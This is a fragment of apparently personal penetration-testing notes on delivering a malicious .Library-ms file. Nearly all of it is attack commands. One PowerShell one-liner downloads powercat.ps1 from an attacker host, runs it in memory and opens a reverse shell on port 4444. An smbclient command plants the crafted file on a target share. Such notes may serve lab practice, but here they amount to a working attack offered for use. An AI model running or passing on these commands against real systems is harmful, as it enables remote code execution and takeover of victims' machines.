- have extension **.Library-ms**
- 
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.213:8000/powercat.ps1');
powercat -c 192.168.45.213 -p 4444 -e powershell"
```

```
smbclient //192.168.168.195/share -c 'put config.Library-ms'
```
